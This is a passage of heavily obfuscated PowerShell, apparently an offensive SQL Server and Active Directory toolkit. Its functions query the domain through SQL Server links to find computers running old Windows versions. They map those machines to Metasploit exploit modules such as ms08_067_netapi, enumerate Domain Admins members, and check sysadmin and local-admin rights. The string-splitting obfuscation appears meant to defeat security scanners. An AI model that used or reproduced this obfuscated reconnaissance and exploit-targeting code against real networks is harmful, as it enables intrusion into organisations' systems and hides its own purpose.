        ${ta`BleE`XPLoI`Ts}."R`OwS".("{0}{1}"-f 'A','dd').Invoke(("{3}{1}{0}{2}" -f ' ','indows','Vista','W'),("{2}{3}{0}{1}" -f'e ','Pack 2','S','ervic'),("{7}{0}{12}{2}{3}{4}{1}{10}{9}{6}{11}{5}{8}{13}" -f'xp','o','oi','t/win','d','_smb2_negoti','9_','e','ate_func_inde','0','ws/smb/ms','050','l','x'),("{11}{10}{1}{0}{7}{4}{5}{9}{8}{2}{6}{3}" -f'w.','/ww','ls.com/cve/2','09-3103','v','e','0','c','tai','de','tp:/','ht')) | &("{2}{1}{0}" -f'l','ul','Out-N')  
        ${t`A`BleEXPloitS}."r`oWS".("{0}{1}" -f'A','dd').Invoke(("{4}{1}{3}{0}{2}" -f'V','ndows','ista',' ','Wi'),("{1}{2}{0}{3}" -f' ','Service Pa','ck','2'),("{3}{1}{2}{4}{6}{0}{5}"-f'pools','dows/','smb','exploit/win','/ms','s','10_061_s'),("{1}{2}{6}{0}{7}{4}{3}{5}{8}"-f'.cved','h','ttp','il','a','s.com/cve/2010-','://www','et','2729')) | &("{2}{1}{0}"-f 'ull','ut-N','O')  
        ${TA`BLE`eXp`LoiTs}."rO`wS".("{1}{0}"-f'd','Ad').Invoke(("{1}{0}{2}"-f 'ndows V','Wi','ista'),"",("{9}{0}{8}{3}{2}{1}{4}{6}{10}{7}{5}" -f 'ploit/window','b','sm','/','/m','7_netapi','s','06','s','ex','08_'),("{5}{4}{0}{1}{6}{2}{3}"-f'e','tail','.com/cve','/2008-4250','ed','http://www.cv','s')) | &("{0}{2}{1}"-f'Out-','ull','N')  
        ${T`A`BLEexPl`oiTs}."ro`WS".("{1}{0}"-f'd','Ad').Invoke(("{0}{2}{1}" -f 'W','dows Vista','in'),"",("{1}{3}{4}{7}{6}{10}{5}{9}{2}{0}{8}" -f'c_i','e','gotiate_fun','x','ploit/','/smb/ms09_05','n','wi','ndex','0_smb2_ne','dows'),("{8}{10}{11}{4}{6}{2}{5}{0}{9}{7}{3}{1}" -f'/20','3','ls.c','310','e','om/cve','detai','9-','htt','0','p','://www.cv')) | &("{0}{2}{1}"-f 'Out','Null','-')  
        ${tAB`Le`ex`pLOIts}."ro`WS".("{1}{0}" -f 'dd','A').Invoke(("{0}{2}{1}" -f 'Win','P','dows X'),("{0}{2}{1}" -f 'S','ver Pack 1','er'),("{0}{6}{1}{2}{4}{5}{3}"-f 'e','w','s/dc','6_dcom','erpc/ms0','3_02','xploit/windo'),("{1}{7}{9}{8}{2}{5}{6}{0}{4}{3}" -f'3-035','ht','tail','/','2','s.com/cve','/200','tp://www.cv','de','e')) | &("{1}{0}{2}" -f 't-Nu','Ou','ll')  
        ${t`AbL`EEX`PLoi`Ts}."r`OWS".("{0}{1}"-f'A','dd').Invoke(("{3}{2}{0}{1}"-f 'X','P','indows ','W'),("{0}{2}{1}" -f 'Server Pa','1','ck '),("{3}{6}{8}{5}{0}{1}{7}{2}{4}" -f 'ce','rpc/ms0','_017','explo','_msmq','/d','it/wind','5','ows'),("{5}{6}{3}{1}{4}{2}{7}{0}" -f '-0059','w.cvedeta','om','//ww','ils.c','http',':','/cve/2005')) | &("{1}{2}{0}" -f 'l','O','ut-Nul')  
        ${ta`BlE`ExpLOI`Ts}."R`Ows".("{0}{1}" -f 'A','dd').Invoke(("{1}{2}{0}{3}" -f 's ','Wi','ndow','XP'),("{2}{3}{1}{0}" -f'k 1','er Pac','Ser','v'),("{1}{4}{5}{2}{0}{3}" -f'_','exploit/wi','4','011_lsass','ndows/smb/','ms0'),("{4}{1}{3}{5}{6}{2}{0}" -f '/','.cvedetails.com/','-0533','cve/','http://www','20','03')) | &("{0}{1}{2}" -f 'O','ut-N','ull')  
        ${tabLeE`x`pLO`Its}."R`OwS".("{1}{0}"-f 'd','Ad').Invoke(("{2}{1}{0}"-f 'P','s X','Window'),("{2}{0}{4}{1}{3}"-f 'er','c','S','k 1','ver Pa'),("{5}{2}{1}{4}{3}{0}"-f'b/ms05_039_pnp','it/wi','xplo','sm','ndows/','e'),("{1}{3}{5}{2}{0}{4}{6}" -f 'edetails.','h','www.cv','t','com/c','tp://','ve/2005-1983')) | &("{1}{0}"-f 'Null','Out-')  
        ${t`A`Bl`eexpl`OIts}."rO`Ws".("{0}{1}"-f 'A','dd').Invoke(("{0}{3}{2}{1}" -f'W','ws XP','do','in'),("{2}{0}{4}{3}{1}"-f'r','1','Serve','Pack ',' '),("{6}{7}{3}{9}{2}{5}{4}{1}{0}{8}" -f 'p','ta','ms','indows/s','e','06_040_n','exploi','t/w','i','mb/'),("{6}{3}{2}{9}{1}{7}{8}{5}{10}{4}{0}"-f '439','s.co','://www.cvedeta','tp','6-3','0','ht','m/c','ve/2','il','0')) | &("{1}{0}"-f 'l','Out-Nul')  
        ${t`Ab`lEE`x`pLOiTs}."r`Ows".("{1}{0}"-f'dd','A').Invoke(("{0}{1}{2}{3}"-f 'Win','dows ','X','P'),("{1}{2}{3}{0}" -f 'ck 2','Servi','c','e Pa'),("{0}{3}{6}{5}{4}{1}{2}" -f'exploit/','7_ms','mq','windows/dc','01','_','erpc/ms05'),("{4}{1}{0}{5}{6}{2}{3}" -f'd','//www.cve','005','9','http:','eta','ils.com/cve/2005-')) | &("{0}{1}" -f'Out-','Null')  
        ${T`A`BLEeXP`LOItS}."rO`Ws".("{0}{1}"-f'A','dd').Invoke(("{0}{2}{1}" -f'Win','P','dows X'),("{0}{2}{1}"-f'Se',' 2','rvice Pack'),("{3}{4}{5}{1}{6}{0}{2}{7}"-f'ms06_0','smb','4','exploit/w','in','dows/','/','0_netapi'),("{5}{6}{1}{2}{9}{7}{8}{4}{0}{3}"-f'6-','s.c','o','3439','200','h','ttp://www.cvedetail','/c','ve/','m')) | &("{2}{1}{0}" -f 'l','l','Out-Nu')  
        ${tAble`ExP`LOITs}."rO`WS".("{1}{0}"-f'dd','A').Invoke(("{2}{3}{0}{1}" -f 'X','P','Wi','ndows '),("{2}{1}{3}{4}{0}" -f 'k 2','rvice','Se',' ','Pac'),("{0}{1}{3}{4}{5}{2}"-f'exploit/windows','/smb','wapi','/ms0','6_','066_n'),("{4}{6}{3}{9}{8}{0}{7}{5}{1}{2}" -f 'e','cve/2006-468','8','/','http','tails.com/',':/','de','w.cv','ww')) | &("{2}{0}{1}" -f'-Nu','ll','Out')  
        ${T`ABl`EeXP`LoItS}."r`OwS".("{0}{1}"-f 'Ad','d').Invoke(("{2}{1}{0}" -f'XP','dows ','Win'),("{2}{0}{1}{3}{4}" -f 'vi','ce Pa','Ser','c','k 2'),("{2}{9}{0}{1}{7}{8}{3}{5}{4}{6}"-f'ndo','w','explo','0_w','v','kss','c','s/smb','/ms06_07','it/wi'),("{10}{5}{4}{3}{11}{2}{8}{9}{0}{1}{6}{7}" -f'i','l','w.cv','//',':','p','s.com/cve','/2006-4691','edet','a','htt','ww')) | &("{1}{2}{0}" -f 'll','O','ut-Nu')  
        ${TAb`le`e`xpLOIts}."R`OWs".("{0}{1}" -f'Ad','d').Invoke(("{0}{2}{1}{3}"-f'Windows','X',' ','P'),("{1}{2}{3}{0}"-f'ck 2','S','ervice',' Pa'),("{1}{6}{4}{7}{5}{0}{3}{2}" -f '_ne','exploit/windows/','i','tap','mb/m','7','s','s08_06'),("{4}{1}{0}{6}{7}{3}{2}{5}" -f '.','ww','0','20','http://w','8-4250','cvedetails.com/c','ve/')) | &("{0}{1}" -f 'Out-N','ull')  
        ${taBlEeXP`lOi`Ts}."R`ows".("{1}{0}"-f 'd','Ad').Invoke(("{0}{2}{1}"-f 'Window','P','s X'),("{0}{4}{2}{1}{3}" -f'Serv','ac',' P','k 2','ice'),("{1}{7}{4}{0}{8}{6}{3}{2}{9}{5}"-f 'dows/smb','e','po','s','win','ss','_061_','xploit/','/ms10','ol'),("{0}{5}{6}{8}{7}{2}{1}{3}{9}{4}{10}" -f'h','ail','det','s','cve/','t','tp:','ve','//www.c','.com/','2010-2729')) | &("{0}{1}{2}" -f'Ou','t-','Null')  
        ${tAbl`Ee`XpLoiTs}."rO`WS".("{0}{1}"-f 'Ad','d').Invoke(("{2}{1}{3}{0}"-f's XP','ind','W','ow'),("{4}{1}{3}{2}{0}"-f'ack 3','v',' P','ice','Ser'),("{3}{4}{2}{6}{0}{5}{7}{1}"-f 'mb/ms08_','netapi','indows','exp','loit/w','067','/s','_'),("{6}{7}{1}{10}{3}{9}{2}{5}{0}{4}{8}"-f've/2008-42','://w','/','.','5','c','ht','tp','0','com','ww.cvedetails')) | &("{2}{1}{0}"-f 'll','-Nu','Out')  
        ${t`AbLe`EXpLO`I`Ts}."RO`WS".("{0}{1}" -f 'A','dd').Invoke(("{0}{1}{2}"-f 'Wind','ows',' XP'),("{0}{1}{2}{3}"-f 'S','ervice',' Pack',' 3'),("{8}{4}{2}{1}{3}{6}{7}{0}{9}{5}"-f'o','/smb/','ows','ms','loit/wind','lss','10_061_','sp','exp','o'),("{7}{1}{4}{2}{3}{6}{0}{5}"-f'10','ttp://www.c','details.','com/cve','ve','-2729','/20','h')) | &("{2}{0}{1}" -f'-Nul','l','Out')  
        ${T`AbLEExp`Lo`its}."r`Ows".("{1}{0}" -f 'dd','A').Invoke(("{0}{2}{1}"-f 'Wind','XP','ows '),"",("{3}{10}{7}{2}{4}{6}{5}{9}{1}{8}{0}" -f 'om','_026_','ndo','exp','ws/dcer','/ms','pc','wi','dc','03','loit/'),("{5}{6}{1}{2}{3}{4}{0}"-f '352/','.cv','edetails.co','m/cve/200','3-0','http:/','/www')) | &("{0}{1}"-f'Out','-Null')  
        ${TABLeE`X`PL`OIts}."Ro`wS".("{0}{1}" -f'Ad','d').Invoke(("{1}{3}{0}{2}"-f 's ','Windo','XP','w'),"",("{4}{2}{0}{6}{3}{5}{1}"-f 'ws/dc','mq','/windo','pc','exploit','/ms05_017_ms','er'),("{3}{1}{7}{0}{6}{2}{4}{5}" -f 'edetai','://www.','com/','http','cve','/2005-0059','ls.','cv')) | &("{2}{0}{1}"-f 't-Nul','l','Ou')  
        ${TaBLe`eXPl`oi`TS}."r`owS".("{0}{1}"-f'A','dd').Invoke(("{2}{0}{1}"-f 'ows',' XP','Wind'),"",("{5}{0}{3}{8}{4}{7}{1}{2}{6}{9}"-f'xplo','s','0','it/windo','m','e','6','b/m','ws/s','_040_netapi'),("{7}{8}{3}{6}{1}{4}{5}{10}{0}{9}{2}" -f 'ails.com/cv','w','3439','p:','w.cv','ede','//w','h','tt','e/2006-','t')) | &("{1}{0}" -f'Null','Out-')  
        ${TaBLe`eX`p`LoItS}."rO`wS".("{0}{1}" -f 'Ad','d').Invoke(("{0}{1}{2}"-f 'W','indows X','P'),"",("{4}{3}{2}{1}{6}{5}{0}"-f 'i','08','s','b/m','exploit/windows/sm','ap','_067_net'),("{6}{1}{4}{3}{8}{11}{9}{10}{0}{2}{5}{7}" -f 'm/','/','cve/200','w','ww','8-425','http:/','0','.cv','tails.','co','ede')) | &("{2}{1}{0}" -f 'Null','t-','Ou')  

        
        ${tAB`lEv`UlnComPU`Te`RS} = &("{3}{2}{1}{0}"-f'ct','je','b','New-O') ("{5}{3}{6}{0}{1}{2}{4}"-f'ata.Data','T','ab','y','le','S','stem.D') 
        ${ta`BL`EVu`L`NCOmp`UTeRs}."CoLU`mnS".("{0}{1}"-f 'A','dd').Invoke(("{0}{2}{1}{3}" -f 'C','puterNa','om','me')) | &("{0}{1}" -f 'Ou','t-Null')
        ${t`Ab`levUL`N`CoM`PUtErs}."COluM`NS".("{1}{0}"-f'd','Ad').Invoke(("{3}{1}{2}{0}"-f'em','ingSy','st','Operat')) | &("{0}{1}{2}" -f'Ou','t-N','ull')
        ${tAblEvuL`NC`o`m`p`UtErS}."C`olu`Mns".("{0}{1}"-f'Ad','d').Invoke(("{0}{3}{1}{2}"-f'Serv','c','k','icePa')) | &("{1}{2}{0}" -f'll','Ou','t-Nu')
        ${tabLEvU`LNc`OMP`U`T`e`RS}."C`oLU`mnS".("{1}{0}" -f'd','Ad').Invoke(("{2}{1}{0}"-f'Logon','st','La')) | &("{1}{0}" -f'ull','Out-N')
        ${T`AbL`EVU`lNCoM`pUTers}."Co`LU`mNS".("{1}{0}"-f'dd','A').Invoke(("{1}{2}{0}" -f 'le','MsfMod','u')) | &("{1}{2}{0}" -f 'Null','Ou','t-')  
        ${T`ABleVUL`NcoMP`UtErS}."COL`U`mNS".("{1}{0}"-f 'dd','A').Invoke('CVE') | &("{1}{0}{2}"-f'Nu','Out-','ll')
    }

    Process
    {
        
        if(${UsE`A`DHOc}){
            ${rEs`U`Lt} = &("{5}{4}{1}{3}{0}{2}"-f'm','t','ainObject','-SQLDo','e','G') -Verbose -Instance ${insT`AN`cE} -Username ${USer`N`AME} -Password ${PaSsw`Ord} -LinkUsername ${lINkuS`eRn`AmE} -LinkPassword ${Li`N`kpaSS`woRD} -LdapPath ${ta`RGEtd`OMAIn} -LdapFilter ("{1}{2}{6}{7}{5}{0}{4}{3}" -f 'om','(','obj','r)','pute','=C','ectCate','gory') -LdapFields ("{5}{16}{11}{8}{15}{21}{7}{9}{6}{10}{2}{4}{12}{14}{22}{18}{1}{19}{3}{0}{13}{20}{17}"-f'l','k,whenc','tin','d,','gsys','dns','i','s','me,operati','temvers','on,opera','na','temse','o','r','ngsystem,operatings','host','ncount','pac','hange','go','y','vice') -UseAdHoc            
        }else{
            ${Re`s`ULt} = &("{3}{1}{4}{0}{2}"-f'Ob','e','ject','G','t-SQLDomain') -Verbose -Instance ${i`NstAnCe} -Username ${uSER`NA`me} -Password ${pasSw`oRd} -LinkUsername ${L`inkUSER`NamE} -LinkPassword ${LIn`KPass`WOrd} -LdapPath ${TAR`g`etdOM`AIn} -LdapFilter (("{6}{3}{0}{5}{1}{2}{7}{4}"-f 'tCat','C','om','ec','er)','egory=','(obj','put')) -LdapFields ("{9}{23}{26}{2}{3}{15}{6}{8}{0}{5}{10}{14}{16}{19}{28}{11}{12}{20}{4}{1}{13}{27}{21}{24}{18}{22}{25}{17}{7}"-f',o','gsyste','t','ings','eratin','p','te','t','m','dnshostna','e','m','version,','m','ratin','ys','gsy','logoncoun','ch','st','op','pack,','ange','me,o','when','d,','pera','service','e')            
        }

        
        ${TAbL`EExP`l`oi`TS} | &("{0}{2}{1}"-f 'Fo','ch-Object','rEa') {
                     
            ${Ex`P`lOITos} = ${_}."oPeRATiNGS`ys`TeM"
            ${e`XpLoi`TSP} = ${_}."Se`RvIcE`p`AcK"
            ${Ex`p`l`oitMsF} = ${_}."mSFM`OD`ULE"
            ${ExpL`o`ItCVE} = ${_}."c`VE"

            
            ${reSu`lT} | &("{1}{0}{2}" -f 'h-Objec','ForEac','t') {
                
                ${A`DShoS`TN`AME} = ${_}."d`NshoStn`Ame"
                ${A`D`SOS} = ${_}."opErATI`Ng`S`ystEM"
                ${A`ds`sp} = ${_}."oPeRAtInGSy`St`Em`sERv`IcepA`ck"                                                      
                ${aDSL`ASt} = ${_}."l`ASt`LoGOn"
                
                
                if (${AD`Sos} -like "$ExploitOS*" -and ${ad`s`Sp} -like "$ExploitSP" ){                    
                   
                    
                    ${table`V`ULnCOmP`UTErs}."r`OWS"."a`dD"(${Ads`Ho`StnAmE},${adS`OS},${Ads`sp}, (gET-vARIablE ('fA'+'ygr3')  ).vAluE::("{2}{0}{1}"-f 'romFile','Time','F').Invoke(${A`d`sLaSt}),${e`xPl`o`ItmsF},${eXPL`oIt`c`VE}) | &("{2}{0}{1}" -f 'ut-Nu','ll','O') 
                }

            }

        }

        ${T`A`BlEvUl`NCoMPUtErS} | &("{1}{2}{3}{0}" -f'Object','S','o','rt-') { ${_}."LaSt`log`On" -as [datetime]} -Descending  

    }

    End
    {               
    }
}





Function  Get-sqldo`mAi`NGRoU`p`MEmber
{
    
    [CmdletBinding()]
    Param(
        [Parameter(ManDatOrY = ${FA`lSE},
        helpMessaGE = {"{7}{4}{6}{8}{3}{1}{0}{2}{10}{9}{5}" -f 'u','main acco','nt to authentic','o','L Ser','.','v','SQ','er or d','er','ate to SQL Serv'})]
        [string]${USe`RN`Ame},

        [Parameter(MANdatORy = ${F`AlsE},
        hElpmesSAGe = {"{19}{5}{6}{8}{2}{12}{14}{16}{20}{3}{0}{10}{11}{17}{9}{4}{13}{18}{15}{1}{7}" -f'count password','SQL S','r ','ac','c',' S','erv','erver.','e','i',' to a','uth','or','ate',' doma',' ','in','ent',' to','SQL',' '})]
        [string]${p`ASsw`oRd},

        [Parameter(mandAtOry = ${fa`L`SE},
        helpmessAge = {"{7}{4}{2}{8}{10}{12}{15}{14}{11}{13}{6}{3}{9}{5}{0}{1}" -f 'nk','.','acco','th','in ','gh SQL Server ADSI li',' ','Doma','un','rou','t used to','ate to',' ',' LDAP','thentic','au'})]
        [string]${lInKuSE`Rn`Ame},

        [Parameter(mAnDatoRY = ${FA`lse},
        HelPmessagE = {"{16}{6}{18}{9}{4}{1}{14}{0}{17}{11}{10}{2}{5}{3}{13}{7}{15}{8}{12}" -f 'ed to a','swor','e to LDAP through SQL ','ver',' pas','Ser','ain','DSI l','nk','account','t','entica','.',' A','d us','i','Dom','uth',' '})]
        [string]${lINkP`As`Sw`ORD},

        [Parameter(MAndATory = ${f`A`lsE},
        HeLPMeSsAge = {"{6}{5}{3}{4}{0}{2}{1}" -f 'redent','.','ials','ndow','s c','i','W'})]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]${CRED`E`NtIAl} =  (gET-cHIlDitem  variAble:0459M2 ).vaLUe::"E`MpTY",

        [Parameter(maNDaTOry = ${f`A`LsE},
                valuEFROMPipeLInEBypROpERtYNamE = ${Tr`UE},
        HELpMesSaGe = {"{2}{6}{4}{5}{7}{1}{3}{0}" -f'.','ec','S','tion to','e to ','c','QL Server instanc','onn'})]
        [string]${INS`Tan`cE},

        [Parameter(MAndaTORY = ${FA`LsE},
                vAluEfrOMpIpELINEBYPrOPERtYNamE = ${Tr`Ue},
        hElpMessaGE = {"{5}{3}{1}{4}{2}{0}{6}"-f 'f',' gr','lter ','in','oup to fi','Doma','or.'})]
        [string]${fIl`T`ER`gRoUP},

        [Parameter(MAndatorY = ${f`A`LSE},
        hElpMESSAgE = {"{12}{21}{8}{40}{32}{20}{31}{6}{17}{27}{22}{39}{36}{3}{33}{2}{34}{4}{11}{38}{14}{1}{10}{7}{13}{30}{0}{16}{15}{19}{35}{9}{24}{37}{25}{28}{18}{23}{5}{26}{29}"-f 'Qu','ver','option (default) w',' lin','cr','ries, and use Op',' inste','and',' connection f','oc o',' link ','eate','Use adh',' us','ADSI ser','. ','ery','ad of','qu','The ','e quer','oc',' se','e','ption','nable a','enRowSet',' a','dhoc ','.','e Open','y','executing th','k ','ill ','AdH','e',' will e',' an ','rver link.  Th','or '})]
        [Switch]${u`SeaDH`Oc},

        [Parameter(MaNDAtOry = ${f`AlsE},
        valuEFromPIPeLineByPRopeRTYNAmE = ${T`Rue},
        HELpmessage = {"{2}{1}{3}{0}"-f 'ery.','ma','Do','in to qu'})]
        [string]${ta`RGeT`doMAIn},

        [Parameter(MaNdAtOry = ${fA`lSE},
        hElPMesSaGE = {"{0}{13}{11}{9}{7}{10}{5}{2}{1}{3}{12}{4}{8}{6}"-f'Suppre','ors','r','.  U','en','e er','apped.','rbo',' function is wr','ve','s','s ','sed wh','s'})]
        [switch]${S`U`pp`REssV`eRbOSE}
    )

    Begin
    {
        
        if(-not ${In`st`AnCe})
        {
            ${In`sT`A`Nce} = ${eNv:`Co`MPUte`RnaMe}
        }

        
        if((-not ${fIltErgR`o`UP})){
            ${FIltEr`G`Ro`Up} = ("{1}{4}{3}{2}{0}" -f'Admins','Do',' ','in','ma')
        }

        ${Ta`BLEMeM`BE`Rs} = &("{1}{0}{2}"-f'jec','New-Ob','t') ("{2}{5}{4}{3}{0}{1}" -f 'a','ble','Sys','ataT','m.Data.D','te')
        ${tab`leMe`mbe`Rs}."c`oLUMNS".("{1}{0}"-f 'd','Ad').Invoke(("{0}{1}"-f'G','roup')) | &("{2}{0}{1}"-f 't-N','ull','Ou')
        ${T`A`BLe`mEMBErs}."C`oLUM`NS".("{1}{0}" -f 'd','Ad').Invoke(("{2}{1}{4}{3}{0}"-f'ame','AMA','s','untN','cco')) | &("{0}{2}{1}"-f 'Out-','ull','N')
        ${tABle`M`EMBE`RS}."c`oluMNs".("{1}{0}"-f'd','Ad').Invoke(("{2}{3}{0}{1}"-f'l','ayName','d','isp')) | &("{0}{2}{1}" -f'Out-','ull','N')
    }

    Process
    {
        
        if(${U`SE`ADHoC}){
            ${FU`LlDN} = &("{4}{0}{1}{3}{2}" -f'-SQ','LDo','ct','mainObje','Get') -Verbose -Instance ${I`Ns`TAN`Ce} -Username ${use`R`N`Ame} -Password ${PASs`wOrd} -LinkUsername ${l`iNkuse`RNa`me} -LinkPassword ${LInkPA`S`sWoRd} -LdapPath ${t`A`RgE`TDO`MAiN} -LdapFilter "(&(objectCategory=group)(samaccountname=$FilterGroup))" -LdapFields ("{4}{2}{0}{3}{1}" -f 'gui','me','stin','shedna','di') -UseAdHoc -SuppressVerbose
        }else{
            ${f`ULlDn} = &("{1}{0}{2}{3}"-f't','Ge','-SQLDom','ainObject') -Verbose -Instance ${in`S`T`AncE} -Username ${US`e`RnA`me} -Password ${p`AssWoRD} -LinkUsername ${lInK`Use`R`NAme} -LinkPassword ${linKp`AS`S`wO`Rd} -LdapPath ${TArGeT`DOM`A`in} -LdapFilter "(&(objectCategory=group)(samaccountname=$FilterGroup))" -LdapFields ("{2}{1}{4}{0}{3}"-f'she','ist','d','dname','ingui') -SuppressVerbose       
        }

        ${d`N} = ${F`Ull`Dn}."d`ISt`iNGUIsHE`dN`AmE"

        
        if(${u`S`EaDhoC}){
            ${RESU`l`Ts} = &("{1}{2}{0}{3}" -f'ainObje','Get-SQLDo','m','ct') -Verbose -Instance ${InSTa`NcE} -Username ${uSER`NA`mE} -Password ${pA`S`SWoRD} -LinkUsername ${l`inkUSe`RNAmE} -LinkPassword ${LI`NkPass`WOrd} -LdapPath ${T`Ar`GEt`dOmaiN} -LdapFilter "(&(objectCategory=user)(memberOf=$DN))" -LdapFields ("{2}{4}{3}{1}{0}" -f 'name',',display','sam','countname','ac') -UseAdHoc
        }else{
            ${RE`Sul`TS} = &("{4}{1}{2}{0}{3}" -f'Obje','SQLDoma','in','ct','Get-') -Verbose -Instance ${INSTaN`cE} -Username ${u`Sern`AmE} -Password ${Pa`Ss`W`orD} -LinkUsername ${l`inkUS`eR`NaMe} -LinkPassword ${L`i`N`KPAssWORd} -LdapPath ${T`A`RG`EtdOM`Ain} -LdapFilter "(&(objectCategory=user)(memberOf=$DN))" -LdapFields ("{3}{0}{5}{2}{7}{1}{8}{6}{4}" -f'maccountn','d','me','sa','playname','a','s',',','i')     
        }

        ${rES`Ul`Ts} | &("{2}{3}{0}{1}" -f'jec','t','For','Each-Ob') {           
            ${Ta`Blem`em`BE`Rs}."R`Ows".("{0}{1}"-f 'A','dd').Invoke(${fiLTerg`R`Oup},${_}."SaM`ACcoUnTN`A`me",${_}."DIsPL`Ayn`AME") | &("{2}{0}{1}"-f'ut-N','ull','O') 
        }

        ${T`Ab`LeMEm`BeRs}

    }

    End
    {               
    }
}





Function  gET`-SQLSYsaDM`iNC`heCK
{
    
    [CmdletBinding()]
    Param(
        [Parameter(mandatORY = ${F`AL`SE},
        heLpmEssAge = {"{1}{6}{8}{0}{4}{7}{5}{3}{2}"-f ' ','SQL',' with.','enticate','domain acc','unt to auth',' S','o','erver or'})]
        [string]${USe`Rna`Me},

        [Parameter(ManDaTOry = ${f`Al`Se},
        hElpmesSaGe = {"{11}{3}{13}{8}{17}{14}{7}{5}{9}{12}{1}{2}{15}{4}{10}{0}{6}{16}"-f 'a','rd',' ',' S','ent','nt p','te wi','n accou','o','ass','ic','SQL','wo','erver ','mai','to auth','th.','r do'})]
        [string]${PAs`S`w`ORd},

        [Parameter(MANdaTory = ${Fa`L`se},
        helpMEsSaGE = {"{2}{1}{0}{3}" -f 'ows cred','ind','W','entials.'})]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]${c`Red`eNT`IAl} =   (IteM  Variable:0459M2 ).VaLUe::"Em`PtY",

        [Parameter(mAnDATORy = ${F`A`LsE},
                VAluefrompiPElINebYpROPERTYName = ${tR`UE},
        helPmESSAGE = {"{8}{5}{3}{4}{1}{0}{6}{2}{9}{7}" -f'ct',' conne','on','r insta','nce to','rve','i','o.','SQL Se',' t'})]
        [string]${I`NSTA`N`cE},

        [Parameter(ManDAtORY = ${F`A`lse},
        HELpmeSSAGE = {"{6}{2}{13}{4}{3}{8}{1}{9}{12}{10}{0}{11}{5}{7}" -f' when f','rs. ','e','er','v','ion is wrap','Suppr','ped.','bose erro',' ','ed','unct','Us','ss '})]
        [switch]${SUPPreSsV`ER`B`ose}
    )

    Begin
    {
        
        ${TblSySA`dmi`NST`A`TUs} = &("{0}{2}{1}"-f'New-Ob','ect','j') -TypeName ("{3}{2}{1}{0}" -f 'a.DataTable','at','.D','System')

        
        if(${C`ReD`EntIa`ln`Ame})
        {
            ${CR`e`Den`Ti`ALNamefIL`TeR} = (' '+'W'+'HERE '+'na'+'me '+'li'+'ke '+"'$CredentialName'")
        }
        else
        {
            ${crEDEnT`IA`lnAmEFIlt`er} = ''
        }

    }

    Process
    {
        
        ${c`oMPute`Rn`AMe} = &("{4}{5}{6}{8}{3}{0}{7}{2}{1}"-f'ameFr','nce','mInsta','erN','G','et','-Comp','o','ut') -Instance ${i`NstANce}

        
        if(-not ${I`N`StaNCE})
        {
            ${In`StaNcE} = ${eNV:CO`m`pu`TERnaME}
        }

        
        ${TE`s`Tc`OnNECtion} = &("{1}{3}{0}{4}{2}" -f'ti','Get-SQL','nTest','Connec','o') -Instance ${I`Ns`TaNCE} -Username ${US`Ern`AmE} -Password ${pAS`s`WoRd} -Credential ${crEDE`N`TiaL} -SuppressVerbose | &("{1}{0}{2}" -f'r','Whe','e-Object') -FilterScript {
            ${_}."sta`T`Us" -eq ("{2}{0}{1}"-f 'cc','essible','A')
        }
        if(${TEsT`C`ONNe`CTIoN})
        {
            if( -not ${Suppre`ss`V`e`RBOSE})
            {
                &("{1}{2}{3}{0}"-f 'Verbose','Wri','te','-') -Message ("$Instance "+': '+'Co'+'n'+'nection '+'Su'+'ccess'+'.')
            }
        }
        else
        {
            if( -not ${S`UPpRe`SsVeRB`oSE})
            {
                &("{4}{2}{0}{3}{1}" -f'e-Verbo','e','t','s','Wri') -Message ("$Instance "+': '+'C'+'on'+'nec'+'tion '+'Faile'+'d'+'.')
            }
            return
        }

        
        ${q`Ue`Ry} = ('S'+'EL'+'ECT '+' '+' '+' '+"'$ComputerName' "+'as'+' '+'[Co'+'mputer'+'Na'+'me],'+'
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"'$Instance' "+'as'+' '+'['+'Ins'+'tance]'+',
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'CAS'+'E'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'W'+'HEN '+('I'+'S_SRVR'+'OLEM'+'EM'+'BER(eVvsysadmineVv'+') ')."REplA`CE"('eVv',[STRing][cHAr]39)+'= '+' '+'0 '+'TH'+'EN '+('gzAN'+'o'+'gzA
 ')."rEpLA`ce"(([ChAR]103+[ChAR]122+[ChAR]65),[sTRing][ChAR]39)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'ELS'+'E '+('7K'+'NYes7'+'KN
 ')."R`E`PlAcE"('7KN',[StrINg][chaR]39)+' '+' '+' '+' '+' '+' '+' '+'EN'+'D '+'as'+' '+'IsSys'+'ad'+'m'+'in')

        
        ${TbL`sysaDm`iN`sta`Tust`EmP} = &("{1}{3}{0}{2}"-f 'SQLQ','G','uery','et-') -Instance ${INsT`AN`ce} -Query ${qu`erY} -Username ${U`serNA`ME} -Password ${PAs`Sw`oRd} -Credential ${c`R`edeNtIAL} -SuppressVerbose

        
        ${tbl`s`YSA`DmIN`StAt`US} = ${T`BL`sysaD`m`insTA`Tus} + ${t`BlsY`Sa`D`MiNS`TAtUsTe`mP}
    }

    End
    {
        
        ${T`BlS`ysaDm`In`sT`ATuS}
    }
}






Function  GEt-sq`LL`oc`A`LaDmI`NCHeCK
{
    
    Begin
    {
    }

    Process
    {
        
        ${WIn`cUrrent`U`S`ER} =   (itEm  ('VA'+'RiABlE:UT'+'njP')).VaLUe::("{1}{0}{2}" -f 'tCur','Ge','rent').Invoke()

        
        ${WI`NCURReNTuS`erna`ME} = ${wINc`U`R`RE`NTusER}."N`Ame"

        
        ${WING`R`ouPs} = &("{2}{1}{0}" -f 'ct','bje','New-O') -TypeName ("{8}{2}{7}{0}{6}{4}{5}{3}{9}{1}"-f '.Princi','al','yst','dowsPrin','.W','in','pal','em.Security','S','cip') -ArgumentList (${win`curRE`Nt`USEr})

        
        ${wi`N`R`oLeChE`cK} =   $MGi::"AD`mIni`St`RaTor"        

        
        ${w`iNgRo`Ups}.("{1}{2}{0}"-f 'e','IsInRo','l').Invoke(${w`inRoLe`Ch`Eck})
    }

    End
    {
    }
}





Function  GET`-Sq`LSERv`Ic`Eacc`Ount
{
    
    [CmdletBinding()]
    Param(
        [Parameter(ManDaTORy = ${fAL`se},
        HElpMESsAGe = {"{3}{5}{6}{1}{7}{10}{0}{2}{9}{4}{8}" -f 'o','erver or d',' authentica','SQ','th','L',' S','omain ac','.','te wi','count t'})]
        [string]${US`ername},

        [Parameter(mANDaToRy = ${Fa`LSE},
